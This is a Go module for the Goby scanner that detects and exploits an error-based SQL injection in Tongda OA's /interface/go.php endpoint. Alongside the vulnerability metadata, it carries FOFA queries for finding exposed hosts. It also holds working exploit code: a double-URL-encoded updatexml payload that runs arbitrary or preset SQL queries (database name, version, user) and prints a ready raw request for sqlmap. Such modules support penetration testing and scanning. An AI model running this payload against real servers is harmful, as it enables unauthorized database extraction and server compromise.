package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda-OA /go.php SQL Injection Vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd., and is a comprehensive management office platform formed by combining with the management practices of Chinese enterprises. </p><p>Access to the OA/go.php interface has SQL injection. An attacker can exploit a SQL injection vulnerability to obtain information in the database, and even write a Trojan to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2022-01-05",
    "PostTime": "2024-09-25",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "GobyQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "Level": "1",
    "Impact": "<p>Access to the OA/go.php interface has SQL injection. An attacker can exploit a SQL injection vulnerability to obtain information in the database, and even write a Trojan to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://xz.aliyun.com/t/10726?time__1311=CqjxRDuDgGi%3DiQD%2FD0eswniEDn0xBQGOoD#toc-8"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select 111*6",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "通达OA /go.php SQL 注入漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。<br></p><p>通达OA /go.php 接口存在SQL注入。攻击者可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>通达OA /go.php 接口存在SQL注入。攻击者可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Tongda-OA /go.php SQL Injection Vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd., and is a comprehensive management office platform formed by combining with the management practices of Chinese enterprises.&nbsp;</p><p>Access to the OA/go.php interface has SQL injection. An attacker can exploit a SQL injection vulnerability to obtain information in the database, and even write a Trojan to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Access to the OA/go.php interface has SQL injection. An attacker can exploit a SQL injection vulnerability to obtain information in the database, and even write a Trojan to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`
	setSqlPayloadHashasduiasfhutygaweyuitrfdyuiagfdutaeueftszdfgasgf := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/interface/go.php"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "application/x-www-form-urlencoded")
		//对sql进行url编码
		sql = url.QueryEscape(sql)
		//二次url编码，替换%27为%2527，替换%22为%2522
		sql = strings.Replace(sql, "%27", "%2527", -1)
		sql = strings.Replace(sql, "%22", "%2522", -1)
		requestConfig.Data = `APP_UNIT=1%2527or%20updatexml(1,concat(0x2a,(` + sql + `)),1)%20and%25271%2527=%25271`
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "364ac83e24a9c25ee8c896892a2f96c9"
			// 无法通过计算MD5等计算手段判断是否存在注入，因此设置了一个随机的固定的值，用于判断是否存在注入，默认情况下不会出现这个值
			sql := `select md5('ascnadsasd')`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `XPATH syntax error: '((.|\n)*?)'<br`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasduiasfhutygaweyuitrfdyuiagfdutaeueftszdfgasgf
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /interface/go.php HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

APP_UNIT=1%2527or%20updatexml(1,concat(0x2a,(select+md5%28%2527ascnadsasd%2527%29)),1)%20and%25271%2527=%25271`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `XPATH syntax error: '((.|\n)*?)'<br`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasduiasfhutygaweyuitrfdyuiagfdutaeueftszdfgasgf
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DATABASE()"
					} else if way == "db_version" {
						sql = "SELECT VERSION()"
					} else if way == "user_name" {
						sql = "SELECT USER()"
					}
				}
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
